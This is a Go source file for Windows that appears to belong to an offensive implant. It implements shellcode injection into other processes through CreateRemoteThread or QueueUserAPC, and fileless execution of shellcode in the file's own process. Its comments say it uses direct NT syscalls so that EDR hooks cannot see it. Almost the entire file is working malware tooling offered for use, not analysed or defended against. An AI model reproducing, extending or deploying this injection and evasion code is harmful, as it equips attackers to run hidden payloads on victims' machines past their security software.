//go:build windows

package main

import (
	"fmt"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

// THREADENTRY32 mirrors the Win32 THREADENTRY32 struct for thread enumeration.
type THREADENTRY32 struct {
	DwSize             uint32
	CntUsage           uint32
	Th32ThreadID       uint32
	Th32OwnerProcessID uint32
	TpBasePri          int32
	TpDeltaPri         int32
	DwFlags            uint32
}

// injectShellcode injects shellcode into a remote process.
// method: "crt" (CreateRemoteThread) | "apc" (QueueUserAPC)
func injectShellcode(targetPID uint32, shellcode []byte, method string) error {
	if len(shellcode) == 0 {
		return fmt.Errorf("empty shellcode")
	}
	switch method {
	case "apc":
		return injectAPC(targetPID, shellcode)
	default: // "crt"
		return injectCRT(targetPID, shellcode)
	}
}

// injectCRT opens the target process, allocates RWX memory via direct NT syscall,
// writes shellcode, and starts a new thread via NtCreateThreadEx — all bypassing
// any userland hooks EDRs place on the Win32/ntdll stubs.
func injectCRT(pid uint32, shellcode []byte) error {
	hProc, err := windows.OpenProcess(processAllAccess, false, pid)
	if err != nil {
		return fmt.Errorf("OpenProcess(%d): %w", pid, err)
	}
	defer windows.CloseHandle(hProc)

	addr, err := ntAlloc(hProc, uintptr(len(shellcode)), pageExecuteReadWrite)
	if err != nil {
		return err
	}

	if err := ntWrite(hProc, addr, shellcode); err != nil {
		ntFree(hProc, addr)
		return err
	}

	hThread, err := ntCreateThread(hProc, addr)
	if err != nil {
		ntFree(hProc, addr)
		return err
	}
	windows.CloseHandle(hThread)
	return nil
}

// injectAPC queues shellcode as an APC to all alertable threads in the target
// process. Allocation and write use direct NT syscalls to bypass EDR hooks.
func injectAPC(pid uint32, shellcode []byte) error {
	hProc, err := windows.OpenProcess(processAllAccess, false, pid)
	if err != nil {
		return fmt.Errorf("OpenProcess(%d): %w", pid, err)
	}
	defer windows.CloseHandle(hProc)

	addr, err := ntAlloc(hProc, uintptr(len(shellcode)), pageExecuteReadWrite)
	if err != nil {
		return err
	}

	if err := ntWrite(hProc, addr, shellcode); err != nil {
		ntFree(hProc, addr)
		return err
	}

	tids, err := processThreadIDs(pid)
	if err != nil || len(tids) == 0 {
		return fmt.Errorf("no threads found in PID %d", pid)
	}

	queued := 0
	for _, tid := range tids {
		hThread, _, _ := procOpenThread.Call(uintptr(threadAllAccess), 0, uintptr(tid))
		if hThread == 0 {
			continue
		}
		procQueueUserAPC.Call(addr, hThread, 0)
		windows.CloseHandle(windows.Handle(hThread))
		queued++
	}
	if queued == 0 {
		return fmt.Errorf("failed to queue APC to any thread in PID %d", pid)
	}
	return nil
}

// execShellcodeSelf allocates RWX memory in the current process via direct
// NT syscall and executes shellcode. Fileless — no payload touches disk.
func execShellcodeSelf(shellcode []byte) error {
	if len(shellcode) == 0 {
		return fmt.Errorf("empty shellcode")
	}

	hSelf := windows.CurrentProcess()
	addr, err := ntAlloc(hSelf, uintptr(len(shellcode)), pageExecuteReadWrite)
	if err != nil {
		return err
	}

	if err := ntWrite(hSelf, addr, shellcode); err != nil {
		ntFree(hSelf, addr)
		return err
	}

	syscall.SyscallN(addr)
	return nil
}

// processThreadIDs returns all thread IDs belonging to pid.
func processThreadIDs(pid uint32) ([]uint32, error) {
	hSnap, _, e := procCreateToolhelp32Snapshot.Call(uintptr(th32csSnapThread), 0)
	if hSnap == ^uintptr(0) {
		return nil, fmt.Errorf("CreateToolhelp32Snapshot: %v", e)
	}
	defer windows.CloseHandle(windows.Handle(hSnap))

	var entry THREADENTRY32
	entry.DwSize = uint32(unsafe.Sizeof(entry))

	r, _, _ := procThread32First.Call(hSnap, uintptr(unsafe.Pointer(&entry)))
	if r == 0 {
		return nil, nil
	}

	var ids []uint32
	for {
		if entry.Th32OwnerProcessID == pid {
			ids = append(ids, entry.Th32ThreadID)
		}
		entry.DwSize = uint32(unsafe.Sizeof(entry))
		r, _, _ = procThread32Next.Call(hSnap, uintptr(unsafe.Pointer(&entry)))
		if r == 0 {
			break
		}
	}
	return ids, nil
}
